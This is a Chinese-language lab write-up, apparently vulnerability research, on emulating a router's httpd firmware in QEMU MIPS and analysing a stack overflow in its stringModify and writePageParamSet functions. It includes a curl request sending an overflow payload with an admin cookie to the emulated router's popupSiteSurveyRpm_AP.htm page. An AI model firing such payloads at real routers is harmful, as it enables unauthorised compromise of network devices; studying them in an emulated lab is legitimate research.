+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nano /etc/network/interfaces</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Loopback interface ,设置回环接口</span></span><br><span class="line">auto lo                    </span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eth0 interface ，设置eth0接口为手动配置模式</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line"><span class="comment"># 将eth0接口的ip地址设置为 0.0.0.0，并启用该接口</span></span><br><span class="line">up ifconfig eth0 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> up</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bridge interface </span></span><br><span class="line">auto br0        <span class="comment">#表示将 eth0 端口加入到桥接接口 br0 中</span></span><br><span class="line">iface br0 inet dhcp  </span><br><span class="line">bridge_ports eth0</span><br><span class="line">bridge_stp off  <span class="comment">#禁用生成树协议 (STP)，可以减少一些延迟</span></span><br><span class="line">bridge_maxwait <span class="number">1</span>  <span class="comment">#设置桥接的最大等待时间为 1 秒</span></span><br></pre></td></tr></tbody></table></figure>
+<p>我的试了不行，我用的是Ubuntu22，好像因为高版本点的Ubuntu用的是 <strong>etc/netplan</strong> </p>
+<p>注意这里的renderer必须改为networkd，不然会显示没有ens33没有桥接到br0</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129173011654.png" alt="image-20241129173011654"> </p>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/netplan/01-network-manager-all.yaml</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Let NetworkManager manage all devices on this system</span></span><br><span class="line">network:</span><br><span class="line">  version: <span class="number">2</span></span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      dhcp4: false  <span class="comment"># 禁用 DHCP，使用静态 IP</span></span><br><span class="line">      optional: true  <span class="comment"># 确保这个接口是可选的</span></span><br><span class="line">  bridges:</span><br><span class="line">    br0:</span><br><span class="line">      interfaces:</span><br><span class="line">        - ens33  <span class="comment"># 将 ens33 添加到桥接接口 br0</span></span><br><span class="line">      dhcp4: true  <span class="comment"># 启用 DHCP 给 br0 分配地址</span></span><br><span class="line">      parameters:</span><br><span class="line">        stp: false  <span class="comment"># 禁用生成树协议</span></span><br><span class="line">        forward-delay: <span class="number">0</span>  <span class="comment"># 设置转发延迟</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></tbody></table></figure>
+<p>配置<strong>qemu-ifup</strong> 脚本</p>
+<p>为了使qemu在启动使自动将网卡（默认使tap0或tap1）加入到桥接网卡中</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nano /etc/qemu-ifup</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">echo <span class="string">"Executing /etc/qemu-ifup"</span>   <span class="comment">#通过 ifconfig 启动传入的接口 $1（例如 tap0）</span></span><br><span class="line">echo <span class="string">"Bringing up $1 for bridged mode..."</span>  <span class="comment">#将接口 $1 添加到桥接接口 br0</span></span><br><span class="line">sudo /sbin/ifconfig $<span class="number">1</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> promisc up  </span><br><span class="line">echo <span class="string">"Adding $1 to br0..."</span></span><br><span class="line">sudo /sbin/brctl addif br0 $<span class="number">1</span></span><br><span class="line"><span class="comment">#sudo ifconfig br0 10.211.55.6/24</span></span><br><span class="line">sleep <span class="number">3</span></span><br></pre></td></tr></tbody></table></figure>
+<p>给脚本执行权限</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /etc/qemu-ifup</span><br></pre></td></tr></tbody></table></figure>
+<p>设置好后，重启开启虚拟机，启动qemu，会多一个br0网卡</p>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic,macaddr=00:0c:29:ee:39:39 -net tap -nographic</span><br></pre></td></tr></tbody></table></figure>
+<p>br0是虚拟机和qemu的桥接接口，ens33虚拟机的网卡接口，tap0是qemu的网卡接口</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129173451337.png" alt="image-20241129173451337"></p>
+<p>设置ip使其在同一网段</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在虚拟机</span></span><br><span class="line">hpp@swikar:~/桌面$ sudo ifconfig br0 <span class="number">192.168</span><span class="number">.123</span><span class="number">.6</span>/<span class="number">24</span> up</span><br><span class="line"><span class="comment">#在qemu</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.123.7/24 up</span></span><br></pre></td></tr></tbody></table></figure>
+<p>成功ping通</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129174243369.png" alt="image-20241129174243369"></p>
+<p>确保qemu的子网掩码和桥接网卡的一致，不然不能传文件</p>
+<p>这里我遇到了个问题，由于较新的Ubuntu的openSSH客户端禁用了过时的算法（如 <code>ssh-rsa</code> 和 <code>ssh-dss</code>），但qemu的ssh服务用的是较老的密钥算法</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo scp -r squashfs-root/ root@192.168.123.7:~/</span></span><br><span class="line">Unable to negotiate with 192.168.123.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">lost connection</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>我这里直接用命令行改用较老的方式</p>
+<p>这里是将路由器的文件系统传到qemu</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -r squashfs-root/ root@<span class="number">192.168</span><span class="number">.123</span><span class="number">.7</span>:~/</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129181503862.png" alt="image-20241129181503862"></p>
+<p>也可以修改ssh客户端配置</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/ssh/ssh_config</span><br></pre></td></tr></tbody></table></figure>
+<p>添加这些内容</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host <span class="number">192.168</span><span class="number">.123</span>.*</span><br><span class="line">    HostKeyAlgorithms +ssh-rsa</span><br><span class="line">    PubkeyAcceptedKeyTypes +ssh-rsa</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -r squashfs-root/ root@<span class="number">192.168</span><span class="number">.123</span><span class="number">.7</span>:~/</span><br></pre></td></tr></tbody></table></figure>
+<p>Ubuntu会没网，需要修改dns</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/systemd/resolved.conf</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Resolve]</span><br><span class="line">DNS=<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="number">8.8</span><span class="number">.4</span><span class="number">.4</span></span><br><span class="line">FallbackDNS=<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="number">8.8</span><span class="number">.4</span><span class="number">.4</span></span><br></pre></td></tr></tbody></table></figure>
+<p>重启服务</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart systemd-resolved</span><br></pre></td></tr></tbody></table></figure>
+<p>挂载系统的proc到固件目录下的proc,这样我们的程序在访问一些内核信息时能读取到，否则程序运行可能会报错</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂载文件系统</span></span><br><span class="line">root@debian-mips:~# mount --bind /proc squashfs-root/proc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更换root目录</span></span><br><span class="line">root@debian-mips:~/squashfs-root# chroot . bin/sh</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129182244602.png" alt="image-20241129182244602"></p>
+<p>直接运行会有很多报错，需要hook掉fork和system函数</p>
+<p>在虚拟机编译hook然后传到qemu</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HOOK: system(\"%s\")"</span>,command);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -shared -fPIC hook.c -o hook</span><br></pre></td></tr></tbody></table></figure>
+<p>把hook传到qemu</p>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -r hook root@192.168.123.7:~/</span><br></pre></td></tr></tbody></table></figure>
+<p>再重新挂载更换root</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~# cp hook squashfs-root/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂载文件系统</span></span><br><span class="line">root@debian-mips:~# mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">root@debian-mips:~# mount --bind /proc squashfs-root/proc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更换root目录</span></span><br><span class="line">root@debian-mips:~/squashfs-root# chroot . bin/sh</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>在文件系统根目录</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   LD_PRELOAD="/hook" /usr/bin/httpd</span></span><br><span class="line">  /usr/<span class="built_in">bin</span>/httpd: can<span class="string">'t load library '</span>libc.so<span class="number">.6</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 使用软链接解决</span></span><br><span class="line"><span class="string">#   ln -s lib/libc.so.0 lib/libc.so.6</span></span><br><span class="line"><span class="string">#   LD_PRELOAD="/hook" /usr/bin/httpd</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129224536063.png" alt="image-20241129224536063"></p>
+<p>把gdbserver复制到qemu</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -r /home/hpp/embedded-tools/binaries/gdbserver/gdbserver.mipsbe root@<span class="number">192.168</span><span class="number">.123</span><span class="number">.7</span>:~/squashfs-root/</span><br></pre></td></tr></tbody></table></figure>
+<p>使用gdbserver将httpd调试转发到2333端口</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># LD_PRELOAD="/hook"</span></span><br><span class="line"><span class="comment"># ./gdbserver.mipsbe 0.0.0.0:1234  /usr/bin/httpd</span></span><br></pre></td></tr></tbody></table></figure>
+<p>试了好久，一直看不到qemu开了80端口，后来无缘无故就可以了</p>
+<p>可以清一下cookie</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241202215550871.png" alt="image-20241202215550871"></p>
+<p>获取cookie和path</p>
+<p>cookie <code>Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D</code></p>
+<p>path <code>RSSCTKQCPJFJLXVB</code></p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241204192409432.png" alt="image-20241204192409432"></p>
+<p>抓一下包</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">'Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D'</span> <span class="string">'http://192.168.123.7/WZJXOVKAWKKMDBGB/userRpm/popupSiteSurveyRpm_AP.htm?mode=1000&amp;curRegion=1000&amp;chanWidth=100&amp;channel=1000&amp;ssid='</span>$(python -c <span class="string">'print( "/%0A"*0x55 + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac")'</span>)<span class="string">''</span></span><br></pre></td></tr></tbody></table></figure>
+<p><strong>Mips常用命令</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>格式</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>lw</td>
+<td>lw R1, 0(R2)</td>
+<td>从存储器中读取一个word存储（Load）到register中</td>
+</tr>
+<tr>
+<td>sw</td>
+<td>sw R1, 0(R2)</td>
+<td>把一个word从register中存储（store）到存储器中</td>
+</tr>
+<tr>
+<td>addiu</td>
+<td>addiu R1,R2,#3</td>
+<td>将一个立即数#3加上R2内容之后存放到目标地址R1</td>
+</tr>
+<tr>
+<td>or</td>
+<td>or R1,R2,R3</td>
+<td>两个寄存器内容相或</td>
+</tr>
+<tr>
+<td>jalr</td>
+<td>jalr R1</td>
+<td>使用寄存器的跳转指令</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>MIPS寄存器功能</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>REGISTER</th>
+<th>NAME</th>
+<th>USAGE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$0</code></td>
+<td><code>$zero</code></td>
+<td>常量0(constant value 0)</td>
+</tr>
+<tr>
+<td><code>$1</code></td>
+<td><code>$at</code></td>
+<td>保留给汇编器(Reserved for assembler)</td>
+</tr>
+<tr>
+<td><code>$2-$3</code></td>
+<td><code>$v0-$v1</code></td>
+<td>函数调用返回值(values for results and expression evaluation)</td>
+</tr>
+<tr>
+<td><code>$4-$7</code></td>
+<td><code>$a0-$a3</code></td>
+<td>函数调用参数(arguments)</td>
+</tr>
+<tr>
+<td><code>$8-$15</code></td>
+<td><code>$t0-$t7</code></td>
+<td>暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td><code>$16-$23</code></td>
+<td><code>$s0-$s7</code></td>
+<td>保存的(或如果用，需要SAVE/RESTORE的)(saved)</td>
+</tr>
+<tr>
+<td><code>$24-$25</code></td>
+<td><code>$t8-$t9</code></td>
+<td>暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td><code>$28</code></td>
+<td><code>$gp</code></td>
+<td>全局指针(Global Pointer)</td>
+</tr>
+<tr>
+<td><code>$29</code></td>
+<td><code>$sp</code></td>
+<td>堆栈指针(Stack Pointer)</td>
+</tr>
+<tr>
+<td><code>$30</code></td>
+<td><code>$fp</code></td>
+<td>帧指针(Frame Pointer)</td>
+</tr>
+<tr>
+<td><code>$31</code></td>
+<td><code>$ra</code></td>
+<td>返回地址(return address)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>mips里的叶子函数和非叶子函数</p>
+<p>叶子函数就是在函数里没有调用其他的函数，返回地址没有压入栈中，而是直接存入寄存器$ra中，<strong>非叶子函数</strong> ，即函数中还调用了其他函数，返回地址在栈中</p>
+<p>mips没有栈底指针，只有一个$sp指向栈顶，没有pop 和push调整指针，而是采用偏移寻址来访问变量</p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h5><p>pwndbg一直调试不了，搞了很久，还是直接看代码吧</p>
+<p>在stringModify字符串转化函数，存在栈溢出漏洞</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这函数是将字符串a3转化复制给a1字符串</span></span><br><span class="line"><span class="comment">//删减版</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">stringModify</span><span class="params">(_BYTE *a1, <span class="type">int</span> size, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// dc</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//初始化a3,将地址转给v4，</span></span><br><span class="line">  v3 = a3 == <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="type">char</span> *)(a3 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v7 = *(v4 - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*(v4 - <span class="number">1</span>) || v5 &gt;= size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//当是  '/'  '&gt;'  '&lt;'  '\\'(反斜杠的表示方式，算一字节)</span></span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">'/'</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= <span class="string">'0'</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> (v7 == <span class="string">'&gt;'</span> || v7 == <span class="string">'\\'</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_18:</span><br><span class="line">        *a1 = <span class="string">'\\'</span>;</span><br><span class="line">LABEL_19:</span><br><span class="line">        ++v5;</span><br><span class="line">        ++a1;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="string">'&lt;'</span> )</span><br><span class="line">      {</span><br><span class="line">        *a1 = <span class="string">'\\'</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      }</span><br><span class="line"><span class="comment">//复制的字符必会经过这</span></span><br><span class="line">LABEL_20:</span><br><span class="line">      ++v5;</span><br><span class="line">      *a1++ = *(v4 - <span class="number">1</span>);   <span class="comment">//将其下一字节等于其本身，即转化前的字符</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      }</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="string">'\r'</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">'"'</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="string">'\n'</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">    }</span><br><span class="line">    v6 = *v4;</span><br><span class="line">      <span class="comment">//等于换行符时</span></span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="string">'\r'</span> &amp;&amp; v6 != <span class="string">'\n'</span> )</span><br><span class="line">    {</span><br><span class="line">      qmemcpy(a1, <span class="string">"&lt;br&gt;"</span>, <span class="number">4</span>);</span><br><span class="line">      a1 += <span class="number">4</span>;</span><br><span class="line">    }</span><br><span class="line">    ++v5;</span><br><span class="line">LABEL_21:</span><br><span class="line">    ++v4;</span><br><span class="line">  }</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>如果字符等于 <code>/ &gt;  &lt;  \\  "</code> 这几个字符转成  \  + <code>/或&gt;...</code>,同时v5计数是2</p>
+<p>如果字符等于 <strong>\r  \n</strong> 等换行符，会把  &lt;<strong>br</strong>&gt; 复制到a1，并且v5只加1，理论上最多可以把原始的字符长度复制成原来的四倍，会有栈溢出</p>
+<p><strong>writePageParamSet</strong> 函数</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">writePageParamSet</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">const</span> <span class="type">char</span> *a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> *v10; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+14h] [-204h]</span></span><br><span class="line">  <span class="type">int</span> v13[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-200h] BYREF</span></span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    HTTP_DEBUG_PRINT(<span class="string">"basicWeb/httpWebV3Common.c:178"</span>, <span class="string">"Never Write NULL to page, %s, %d"</span>, <span class="string">"writePageParamSet"</span>, <span class="number">178</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(a2, <span class="string">"\"%s\","</span>, a3) )</span><br><span class="line">  {</span><br><span class="line">    result = <span class="built_in">strcmp</span>(a2, <span class="string">"%d,"</span>, v6);</span><br><span class="line">    v8 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    v10 = *(<span class="type">int</span> **)a3;</span><br><span class="line">    v9 = a2;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">      <span class="comment">//这里调用了stringModyfy函数</span></span><br><span class="line">    <span class="keyword">if</span> ( stringModify(v13, <span class="number">0x200</span>, (<span class="type">int</span>)a3) &lt; <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"string modify error!"</span>);</span><br><span class="line">      HIBYTE(v13[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v8 = a1;</span><br><span class="line">    v9 = a2;</span><br><span class="line">    v10 = v13;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> httpPrintf(v8, v9, (<span class="type">int</span>)v10, v7, (<span class="type">int</span>)&amp;unk_594D80, v12, v13[<span class="number">0</span>], v13[<span class="number">1</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
